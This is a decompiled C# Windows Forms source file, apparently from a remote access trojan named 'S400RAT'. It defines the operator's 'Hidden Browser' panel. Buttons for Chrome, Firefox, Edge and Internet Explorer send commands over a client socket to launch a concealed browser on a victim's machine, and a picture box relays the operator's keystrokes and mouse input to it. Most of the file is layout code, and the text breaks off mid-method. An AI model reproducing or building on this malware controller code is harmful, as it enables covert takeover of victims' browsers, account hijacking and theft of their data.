using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SQLABC_ModernUI;

namespace S400RAT;

[DesignerGenerated]
public class HBR : Form
{
	public IContainer icontainer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2AnimateWindow1")]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[AccessedThroughProperty("Guna2BorderlessForm1")]
	[CompilerGenerated]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[AccessedThroughProperty("Guna2ControlBox1")]
	[CompilerGenerated]
	public Guna2ControlBox guna2ControlBox_0;

	[AccessedThroughProperty("Label1")]
	[CompilerGenerated]
	public Label label_0;

	[AccessedThroughProperty("Timer1")]
	[CompilerGenerated]
	public Timer timer_0;

	[AccessedThroughProperty("Label7")]
	[CompilerGenerated]
	public Label label_1;

	[AccessedThroughProperty("PictureBox2")]
	[CompilerGenerated]
	public PictureBox MoaTfKbirC;

	[AccessedThroughProperty("CCC")]
	[CompilerGenerated]
	public Panel panel_0;

	[AccessedThroughProperty("Panel1")]
	[CompilerGenerated]
	public Panel panel_1;

	[AccessedThroughProperty("Label6")]
	[CompilerGenerated]
	public Label label_2;

	[AccessedThroughProperty("PictureBox1")]
	[CompilerGenerated]
	public PictureBox pictureBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Label5")]
	public Label label_3;

	[CompilerGenerated]
	[AccessedThroughProperty("P1")]
	public Panel panel_2;

	[CompilerGenerated]
	[AccessedThroughProperty("Label22")]
	public Label label_4;

	[CompilerGenerated]
	[AccessedThroughProperty("Cstart")]
	public Guna2GradientButton guna2GradientButton_0;

	[AccessedThroughProperty("Cprog")]
	[CompilerGenerated]
	public Guna2CircleProgressBar guna2CircleProgressBar_0;

	[CompilerGenerated]
	[AccessedThroughProperty("P4")]
	public Panel panel_3;

	[AccessedThroughProperty("Label3")]
	[CompilerGenerated]
	public Label label_5;

	[AccessedThroughProperty("Istart")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_1;

	[AccessedThroughProperty("Iprog")]
	[CompilerGenerated]
	public Guna2CircleProgressBar guna2CircleProgressBar_1;

	[AccessedThroughProperty("P2")]
	[CompilerGenerated]
	public Panel panel_4;

	[AccessedThroughProperty("Label4")]
	[CompilerGenerated]
	public Label label_6;

	[AccessedThroughProperty("Fstart")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_2;

	[AccessedThroughProperty("Fprog")]
	[CompilerGenerated]
	public Guna2CircleProgressBar guna2CircleProgressBar_2;

	[AccessedThroughProperty("P3")]
	[CompilerGenerated]
	public Panel panel_5;

	[AccessedThroughProperty("Label2")]
	[CompilerGenerated]
	public Label label_7;

	[AccessedThroughProperty("Mstart")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Mprog")]
	public Guna2CircleProgressBar guna2CircleProgressBar_3;

	[AccessedThroughProperty("BrowserBox")]
	[CompilerGenerated]
	public Guna2PictureBox guna2PictureBox_0;

	[AccessedThroughProperty("SqlabC_ControlMini1")]
	[CompilerGenerated]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	[AccessedThroughProperty("Clos")]
	[CompilerGenerated]
	public Timer timer_1;

	public Client sk;

	public Point point_0;

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_5;
			Guna2ControlBox guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click -= value2;
			}
			guna2ControlBox_0 = value;
			guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click += value2;
			}
		}
	}

	public virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[CompilerGenerated]
		get
		{
			return MoaTfKbirC;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_9;
			PictureBox moaTfKbirC = MoaTfKbirC;
			if (moaTfKbirC != null)
			{
				moaTfKbirC.Click -= value2;
			}
			MoaTfKbirC = value;
			moaTfKbirC = MoaTfKbirC;
			if (moaTfKbirC != null)
			{
				moaTfKbirC.Click += value2;
			}
		}
	}

	public virtual Panel CCC
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	public virtual Panel Panel1
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	internal virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	public virtual Label Label5
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Panel P1
	{
		[CompilerGenerated]
		get
		{
			return panel_2;
		}
		[CompilerGenerated]
		set
		{
			panel_2 = value;
		}
	}

	public virtual Label Label22
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	internal virtual Guna2GradientButton Cstart
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_1;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2CircleProgressBar Cprog
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_0;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_0 = value;
		}
	}

	public virtual Panel P4
	{
		[CompilerGenerated]
		get
		{
			return panel_3;
		}
		[CompilerGenerated]
		set
		{
			panel_3 = value;
		}
	}

	public virtual Label Label3
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	internal virtual Guna2GradientButton Istart
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_4;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_1 = value;
			guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2CircleProgressBar Iprog
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_1;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_1 = value;
		}
	}

	public virtual Panel P2
	{
		[CompilerGenerated]
		get
		{
			return panel_4;
		}
		[CompilerGenerated]
		set
		{
			panel_4 = value;
		}
	}

	public virtual Label Label4
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	internal virtual Guna2GradientButton Fstart
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_2;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_2;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_2;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_2 = value;
			guna2GradientButton = guna2GradientButton_2;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2CircleProgressBar Fprog
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_2;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_2 = value;
		}
	}

	public virtual Panel P3
	{
		[CompilerGenerated]
		get
		{
			return panel_5;
		}
		[CompilerGenerated]
		set
		{
			panel_5 = value;
		}
	}

	public virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	internal virtual Guna2GradientButton Mstart
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_3;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_3;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_3;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_3 = value;
			guna2GradientButton = guna2GradientButton_3;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2CircleProgressBar Mprog
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_3;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_3 = value;
		}
	}

	internal virtual Guna2PictureBox BrowserBox
	{
		[CompilerGenerated]
		get
		{
			return guna2PictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			KeyPressEventHandler value2 = method_6;
			PaintEventHandler value3 = method_7;
			MouseEventHandler value4 = method_8;
			EventHandler value5 = method_10;
			Guna2PictureBox guna2PictureBox = guna2PictureBox_0;
			if (guna2PictureBox != null)
			{
				guna2PictureBox.KeyPress -= value2;
				guna2PictureBox.Paint -= value3;
				guna2PictureBox.MouseDown -= value4;
				guna2PictureBox.Click -= value5;
			}
			guna2PictureBox_0 = value;
			guna2PictureBox = guna2PictureBox_0;
			if (guna2PictureBox != null)
			{
				guna2PictureBox.KeyPress += value2;
				guna2PictureBox.Paint += value3;
				guna2PictureBox.MouseDown += value4;
				guna2PictureBox.Click += value5;
			}
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	public HBR()
	{
		base.Load += HBR_Load;
		base.Resize += HBR_Resize;
		point_0 = new Point(30, 30);
		method_0();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(HBR));
		vmethod_1(new Guna2AnimateWindow(icontainer_0));
		vmethod_3(new Guna2BorderlessForm(icontainer_0));
		Guna2ControlBox1 = new Guna2ControlBox();
		Label1 = new Label();
		vmethod_5(new Timer(icontainer_0));
		Label7 = new Label();
		PictureBox2 = new PictureBox();
		BrowserBox = new Guna2PictureBox();
		CCC = new Panel();
		Panel1 = new Panel();
		Label6 = new Label();
		PictureBox1 = new PictureBox();
		Label5 = new Label();
		P1 = new Panel();
		Label22 = new Label();
		Cstart = new Guna2GradientButton();
		Cprog = new Guna2CircleProgressBar();
		P4 = new Panel();
		Label3 = new Label();
		Istart = new Guna2GradientButton();
		Iprog = new Guna2CircleProgressBar();
		P2 = new Panel();
		Label4 = new Label();
		Fstart = new Guna2GradientButton();
		Fprog = new Guna2CircleProgressBar();
		P3 = new Panel();
		Label2 = new Label();
		Mstart = new Guna2GradientButton();
		Mprog = new Guna2CircleProgressBar();
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		vmethod_7(new Timer(icontainer_0));
		((ISupportInitialize)PictureBox2).BeginInit();
		((ISupportInitialize)BrowserBox).BeginInit();
		CCC.SuspendLayout();
		Panel1.SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		P1.SuspendLayout();
		P4.SuspendLayout();
		P2.SuspendLayout();
		P3.SuspendLayout();
		SuspendLayout();
		vmethod_2().ContainerControl = this;
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BackColor = Color.Transparent;
		Guna2ControlBox1.BorderColor = Color.Transparent;
		Guna2ControlBox1.FillColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(708, 1);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 119;
		Label1.AutoSize = true;
		Label1.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label1.ForeColor = Color.White;
		Label1.Location = new Point(44, 2);
		Label1.Name = "Label1";
		Label1.Size = new Size(146, 25);
		Label1.TabIndex = 0;
		Label1.Text = "Hidden Browser";
		Label7.AutoSize = true;
		Label7.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.White;
		Label7.Location = new Point(482, 14);
		Label7.Name = "Label7";
		Label7.Size = new Size(23, 13);
		Label7.TabIndex = 132;
		Label7.Text = "....";
		Label7.Visible = false;
		PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
		PictureBox2.Location = new Point(0, 1);
		PictureBox2.Name = "PictureBox2";
		PictureBox2.Size = new Size(40, 29);
		PictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox2.TabIndex = 137;
		PictureBox2.TabStop = false;
		BrowserBox.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		BrowserBox.BackColor = Color.Transparent;
		BrowserBox.Location = new Point(12, 48);
		BrowserBox.Name = "BrowserBox";
		BrowserBox.ShadowDecoration.Parent = BrowserBox;
		BrowserBox.Size = new Size(731, 483);
		BrowserBox.SizeMode = PictureBoxSizeMode.StretchImage;
		BrowserBox.TabIndex = 138;
		BrowserBox.TabStop = false;
		CCC.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		CCC.BackColor = Color.FromArgb(37, 42, 64);
		CCC.Controls.Add(Panel1);
		CCC.Controls.Add(P1);
		CCC.Controls.Add(P4);
		CCC.Controls.Add(P2);
		CCC.Controls.Add(P3);
		CCC.ForeColor = Color.Transparent;
		CCC.Location = new Point(12, 48);
		CCC.Name = "CCC";
		CCC.Size = new Size(731, 483);
		CCC.TabIndex = 139;
		Panel1.BackColor = Color.FromArgb(24, 30, 54);
		Panel1.Controls.Add(Label6);
		Panel1.Controls.Add(PictureBox1);
		Panel1.Controls.Add(Label5);
		Panel1.ForeColor = Color.Transparent;
		Panel1.Location = new Point(42, 14);
		Panel1.Name = "Panel1";
		Panel1.Size = new Size(431, 226);
		Panel1.TabIndex = 136;
		Label6.AutoSize = true;
		Label6.Location = new Point(8, 151);
		Label6.Name = "Label6";
		Label6.Size = new Size(394, 65);
		Label6.TabIndex = 131;
		Label6.Text = componentResourceManager.GetString("Label6.Text");
		PictureBox1.Image = (Image)componentResourceManager.GetObject("PictureBox1.Image");
		PictureBox1.Location = new Point(196, 27);
		PictureBox1.Name = "PictureBox1";
		PictureBox1.Size = new Size(63, 64);
		PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox1.TabIndex = 130;
		PictureBox1.TabStop = false;
		Label5.AutoSize = true;
		Label5.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label5.ForeColor = Color.White;
		Label5.Location = new Point(6, 110);
		Label5.Name = "Label5";
		Label5.Size = new Size(168, 25);
		Label5.TabIndex = 129;
		Label5.Text = "Usage information";
		P1.BackColor = Color.FromArgb(24, 30, 54);
		P1.Controls.Add(Label22);
		P1.Controls.Add(Cstart);
		P1.Controls.Add(Cprog);
		P1.Enabled = false;
		P1.ForeColor = Color.Transparent;
		P1.Location = new Point(479, 14);
		P1.Name = "P1";
		P1.Size = new Size(213, 226);
		P1.TabIndex = 132;
		Label22.AutoSize = true;
		Label22.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label22.ForeColor = Color.White;
		Label22.Location = new Point(6, 7);
		Label22.Name = "Label22";
		Label22.Size = new Size(145, 25);
		Label22.TabIndex = 0;
		Label22.Text = "Google Chrome";
		Cstart.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Cstart.Animated = true;
		Cstart.AutoRoundedCorners = true;
		Cstart.BackColor = Color.Transparent;
		Cstart.BorderRadius = 21;
		Cstart.CheckedState.Parent = Cstart;
		Cstart.CustomImages.Parent = Cstart;
		Cstart.FillColor = Color.FromArgb(37, 42, 64);
		Cstart.FillColor2 = Color.FromArgb(37, 42, 64);
		Cstart.Font = new Font("Segoe UI", 9f);
		Cstart.ForeColor = Color.White;
		Cstart.HoverState.Parent = Cstart;
		Cstart.IndicateFocus = true;
		Cstart.Location = new Point(8, 172);
		Cstart.Name = "Cstart";
		Cstart.ShadowDecoration.Parent = Cstart;
		Cstart.Size = new Size(197, 44);
		Cstart.TabIndex = 126;
		Cstart.Text = "Not found !";
		Cstart.UseTransparentBackground = true;
		Cprog.FillThickness = 10;
		Cprog.Image = (Image)componentResourceManager.GetObject("Cprog.Image");
		Cprog.Location = new Point(50, 51);
		Cprog.Name = "Cprog";
		Cprog.ProgressBrushMode = BrushMode.Solid;
		Cprog.ProgressColor = Color.FromArgb(0, 126, 249);
		Cprog.ProgressColor2 = Color.FromArgb(0, 192, 0);
		Cprog.ProgressEndCap = LineCap.Round;
		Cprog.ProgressStartCap = LineCap.Round;
		Cprog.ProgressThickness = 10;
		Cprog.ShadowDecoration.Mode = ShadowMode.Circle;
		Cprog.ShadowDecoration.Parent = Cprog;
		Cprog.Size = new Size(109, 108);
		Cprog.TabIndex = 128;
		Cprog.Value = 45;
		P4.BackColor = Color.FromArgb(24, 30, 54);
		P4.Controls.Add(Label3);
		P4.Controls.Add(Istart);
		P4.Controls.Add(Iprog);
		P4.Enabled = false;
		P4.ForeColor = Color.Transparent;
		P4.Location = new Point(477, 246);
		P4.Name = "P4";
		P4.Size = new Size(213, 226);
		P4.TabIndex = 135;
		Label3.AutoSize = true;
		Label3.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label3.ForeColor = Color.White;
		Label3.Location = new Point(6, 7);
		Label3.Name = "Label3";
		Label3.Size = new Size(153, 25);
		Label3.TabIndex = 0;
		Label3.Text = "internet explorer";
		Istart.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Istart.Animated = true;
		Istart.AutoRoundedCorners = true;
		Istart.BackColor = Color.Transparent;
		Istart.BorderRadius = 21;
		Istart.CheckedState.Parent = Istart;
		Istart.CustomImages.Parent = Istart;
		Istart.FillColor = Color.FromArgb(37, 42, 64);
		Istart.FillColor2 = Color.FromArgb(37, 42, 64);
		Istart.Font = new Font("Segoe UI", 9f);
		Istart.ForeColor = Color.White;
		Istart.HoverState.Parent = Istart;
		Istart.IndicateFocus = true;
		Istart.Location = new Point(8, 172);
		Istart.Name = "Istart";
		Istart.ShadowDecoration.Parent = Istart;
		Istart.Size = new Size(197, 44);
		Istart.TabIndex = 126;
		Istart.Text = "Not found";
		Istart.UseTransparentBackground = true;
		Iprog.FillThickness = 10;
		Iprog.Image = (Image)componentResourceManager.GetObject("Iprog.Image");
		Iprog.Location = new Point(50, 51);
		Iprog.Name = "Iprog";
		Iprog.ProgressBrushMode = BrushMode.Solid;
		Iprog.ProgressColor = Color.FromArgb(0, 126, 249);
		Iprog.ProgressColor2 = Color.FromArgb(0, 192, 0);
		Iprog.ProgressEndCap = LineCap.Round;
		Iprog.ProgressStartCap = LineCap.Round;
		Iprog.ProgressThickness = 10;
		Iprog.ShadowDecoration.Mode = ShadowMode.Circle;
		Iprog.ShadowDecoration.Parent = Iprog;
		Iprog.Size = new Size(109, 108);
		Iprog.TabIndex = 128;
		Iprog.Value = 45;
		P2.BackColor = Color.FromArgb(24, 30, 54);
		P2.Controls.Add(Label4);
		P2.Controls.Add(Fstart);
		P2.Controls.Add(Fprog);
		P2.Enabled = false;
		P2.ForeColor = Color.Transparent;
		P2.Location = new Point(42, 246);
		P2.Name = "P2";
		P2.Size = new Size(213, 226);
		P2.TabIndex = 134;
		Label4.AutoSize = true;
		Label4.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label4.ForeColor = Color.White;
		Label4.Location = new Point(6, 7);
		Label4.Name = "Label4";
		Label4.Size = new Size(69, 25);
		Label4.TabIndex = 0;
		Label4.Text = "Firefox";
		Fstart.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Fstart.Animated = true;
		Fstart.AutoRoundedCorners = true;
		Fstart.BackColor = Color.Transparent;
		Fstart.BorderRadius = 21;
		Fstart.CheckedState.Parent = Fstart;
		Fstart.CustomImages.Parent = Fstart;
		Fstart.FillColor = Color.FromArgb(37, 42, 64);
		Fstart.FillColor2 = Color.FromArgb(37, 42, 64);
		Fstart.Font = new Font("Segoe UI", 9f);
		Fstart.ForeColor = Color.White;
		Fstart.HoverState.Parent = Fstart;
		Fstart.IndicateFocus = true;
		Fstart.Location = new Point(8, 172);
		Fstart.Name = "Fstart";
		Fstart.ShadowDecoration.Parent = Fstart;
		Fstart.Size = new Size(197, 44);
		Fstart.TabIndex = 126;
		Fstart.Text = "Not fond !";
		Fstart.UseTransparentBackground = true;
		Fprog.FillThickness = 10;
		Fprog.Image = (Image)componentResourceManager.GetObject("Fprog.Image");
		Fprog.Location = new Point(50, 51);
		Fprog.Name = "Fprog";
		Fprog.ProgressBrushMode = BrushMode.Solid;
		Fprog.ProgressColor = Color.FromArgb(0, 126, 249);
		Fprog.ProgressColor2 = Color.FromArgb(0, 192, 0);
		Fprog.ProgressEndCap = LineCap.Round;
		Fprog.ProgressStartCap = LineCap.Round;
		Fprog.ProgressThickness = 10;
		Fprog.ShadowDecoration.Mode = ShadowMode.Circle;
		Fprog.ShadowDecoration.Parent = Fprog;
		Fprog.Size = new Size(109, 108);
		Fprog.TabIndex = 128;
		Fprog.Value = 45;
		P3.BackColor = Color.FromArgb(24, 30, 54);
		P3.Controls.Add(Label2);
		P3.Controls.Add(Mstart);
		P3.Controls.Add(Mprog);
		P3.Enabled = false;
		P3.ForeColor = Color.Transparent;
		P3.Location = new Point(260, 246);
		P3.Name = "P3";
		P3.Size = new Size(213, 226);
		P3.TabIndex = 133;
		Label2.AutoSize = true;
		Label2.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label2.ForeColor = Color.White;
		Label2.Location = new Point(6, 7);
		Label2.Name = "Label2";
		Label2.Size = new Size(139, 25);
		Label2.TabIndex = 0;
		Label2.Text = "Microsoft Edge";
		Mstart.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Mstart.Animated = true;
		Mstart.AutoRoundedCorners = true;
		Mstart.BackColor = Color.Transparent;
		Mstart.BorderRadius = 21;
		Mstart.CheckedState.Parent = Mstart;
		Mstart.CustomImages.Parent = Mstart;
		Mstart.FillColor = Color.FromArgb(37, 42, 64);
		Mstart.FillColor2 = Color.FromArgb(37, 42, 64);
		Mstart.Font = new Font("Segoe UI", 9f);
		Mstart.ForeColor = Color.White;
		Mstart.HoverState.Parent = Mstart;
		Mstart.IndicateFocus = true;
		Mstart.Location = new Point(8, 172);
		Mstart.Name = "Mstart";
		Mstart.ShadowDecoration.Parent = Mstart;
		Mstart.Size = new Size(197, 44);
		Mstart.TabIndex = 126;
		Mstart.Text = "Not found !";
		Mstart.UseTransparentBackground = true;
		Mprog.FillThickness = 10;
		Mprog.Image = (Image)componentResourceManager.GetObject("Mprog.Image");
		Mprog.Location = new Point(50, 51);
		Mprog.Name = "Mprog";
		Mprog.ProgressBrushMode = BrushMode.Solid;
		Mprog.ProgressColor = Color.FromArgb(0, 126, 249);
		Mprog.ProgressColor2 = Color.FromArgb(0, 192, 0);
		Mprog.ProgressEndCap = LineCap.Round;
		Mprog.ProgressStartCap = LineCap.Round;
		Mprog.ProgressThickness = 10;
		Mprog.ShadowDecoration.Mode = ShadowMode.Circle;
		Mprog.ShadowDecoration.Parent = Mprog;
		Mprog.Size = new Size(109, 108);
		Mprog.TabIndex = 128;
		Mprog.Value = 45;
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(46, 51, 73);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
		SqlabC_ControlMini1.Location = new Point(687, 7);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 140;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		vmethod_6().Enabled = true;
		vmethod_6().Interval = 10;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(46, 51, 73);
		base.ClientSize = new Size(755, 543);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(CCC);
		base.Controls.Add(BrowserBox);
		base.Controls.Add(PictureBox2);
		base.Controls.Add(Label7);
		base.Controls.Add(Label1);
		base.Controls.Add(Guna2ControlBox1);
		base.FormBorderStyle = FormBorderStyle.None;
		base.KeyPreview = true;
		base.Name = "HBR";
		Text = "HBR";
		((ISupportInitialize)PictureBox2).EndInit();
		((ISupportInitialize)BrowserBox).EndInit();
		CCC.ResumeLayout(performLayout: false);
		Panel1.ResumeLayout(performLayout: false);
		Panel1.PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		P1.ResumeLayout(performLayout: false);
		P1.PerformLayout();
		P4.ResumeLayout(performLayout: false);
		P4.PerformLayout();
		P2.ResumeLayout(performLayout: false);
		P2.PerformLayout();
		P3.ResumeLayout(performLayout: false);
		P3.PerformLayout();
		ResumeLayout(performLayout: false);
		PerformLayout();
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_0()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_2()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_4()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Timer WithEventsValue)
	{
		timer_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_6()
	{
		return timer_1;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_7(Timer WithEventsValue)
	{
		EventHandler value = method_12;
		Timer timer = timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_1 = WithEventsValue;
		timer = timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	public void method_1(object sender, EventArgs e)
	{
		if (Operators.CompareString(Cstart.Text, "Browser Start", TextCompare: false) == 0)
		{
			Class7.int_14 = 0;
			Fprog.Animated = false;
			Mprog.Animated = false;
			Iprog.Animated = false;
			Cprog.Animated = true;
			P2.Enabled = false;
			P3.Enabled = false;
			P4.Enabled = false;
			sk.Send("Get" + Class7.string_1 + "Chrome");
			Cstart.Text = "Browser Start...";
			Cstart.Enabled = false;
		}
	}

	public void method_2(object sender, EventArgs e)
	{
		if (Operators.CompareString(Fstart.Text, "Browser Start", TextCompare: false) == 0)
		{
			Class7.int_14 = 0;
			Cprog.Animated = false;
			Mprog.Animated = false;
			Iprog.Animated = false;
			Fprog.Animated = true;
			P1.Enabled = false;
			P3.Enabled = false;
			P4.Enabled = false;
			sk.Send("Get" + Class7.string_1 + "Firefox");
			Fstart.Text = "Browser Start...";
			Fstart.Enabled = false;
		}
	}

	public void method_3(object sender, EventArgs e)
	{
		if (Operators.CompareString(Mstart.Text, "Browser Start", TextCompare: false) == 0)
		{
			Class7.int_14 = 0;
			Cprog.Animated = false;
			Fprog.Animated = false;
			Iprog.Animated = false;
			Mprog.Animated = true;
			P1.Enabled = false;
			P2.Enabled = false;
			P4.Enabled = false;
			sk.Send("Get" + Class7.string_1 + "Edge");
			Mstart.Text = "Browser Start...";
			Mstart.Enabled = false;
		}
	}

	public void method_4(object sender, EventArgs e)
	{
		if (Operators.CompareString(Istart.Text, "Browser Start", TextCompare: false) == 0)
		{
			Class7.int_14 = 0;
			Cprog.Animated = false;
			Mprog.Animated = false;
			Fprog.Animated = false;
			Iprog.Animated = true;
			P1.Enabled = false;
